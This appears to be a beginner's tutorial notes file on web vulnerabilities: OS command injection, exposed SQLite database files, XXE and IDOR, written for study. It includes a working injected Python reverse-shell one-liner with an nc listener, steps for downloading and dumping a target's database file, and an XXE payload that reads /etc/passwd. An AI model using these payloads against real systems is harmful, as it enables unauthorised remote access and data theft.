 #                                         💪 ` Web-Vulnerabilites ` 💪




## 🥇1. OS Command Injection :

### What is OS Command Injection ?

OS Command Injection is server side  web vulnerablities where attacker execute :eyes:" system command"  like id, whoami ,uname etc os command  .
It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.


### Types Of OS Commnad Injection :

                                  There are two types of OS command injection  such as :
                                                                           
                                                                                        i. Active OS command injection
                                
                                                                                        ii. Blind OS command injection
                                                                                       

### Active OS Command Injection :


Active command injection will return the response to the user.  It can be made visible through several HTML elements. That means when a attacker execute :eyes: "system command "  like ls ,server will return result of ls .(Attacker will see the result of ls ) .It is so easy to execute . 


### Blind OS Command Injection :
      
Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document . That means when a  attacker execute " system command "  like ls ,server will not return result of ls but  server execute ls command . For  , seeing the result of :eyes: "system command " you must upload reverse shell on target / victim server . After uploading  reverse shell on victim server , you must be  listen uploaded shell on attacker terminal using nc command . 


### Example :
         
        ♥️  1. upload reverse shell :
                                  ; python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

           2. listen reverse shell :

                                 nc -lnvp 4242

Note : 
           
       1. Change ip according to your local host ip
        
       2. One can easily  uploaded  shell if OS command injection is occured .
              

# 🥈2. Sqlite3 or "flat-file" :

When databases stored as a file it's called "flat-file"  .The extension of those file is db . ( like webapp.db , base.db )

Process :

               1.  At first   download  " flat-file " from target web app  . ( Use dirsearch or gobuster for exposing  flat-file directory )

               2.  Then  , expose sensitve data from "flat-file "  using sqlite3 


Use Of Sqlite3 :

                       sqlite3 target_file 

                      .help 

                      .tables

                      .schema table_name

                      select * from table_name ;  // see more //
                      
                
# 🥉3. XML OR XML External Entity OR XXE :

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.

#### :-1:Disadvantage of XML attack :
                                           
                                           1. Cause of  Denial of Service (DoS) attack

                                           2. Could use XXE to perform Server-Side Request Forgery (SSRF) 

                                           3.  XXE may even enable port scanning and lead to remote code execution.

#### There are Two types of XXE attacks :
                          
                                                      1. in-band xxe
                                                      
                                                      2.out-of-band xxe

1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.


##### :pray:Note : For better understanding you need to learn basic of XML language 

### 👀 XXE Payload :

Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

         <!DOCTYPE replace [<!ENTITY name "feast"> ]>
         <userInfo>
           <firstName>falcon</firstName>
           <lastName>&name;</lastName>
         </userInfo>



As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

         <?xml version="1.0"?>
         <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
         <root>&read;</root>

Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.


# 🔊4.Broken Access -IDOR :

###### IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.


### 👁️ Conclusion of IDOR : When  you change the value of (get /post) parameter  , you will see other user information .

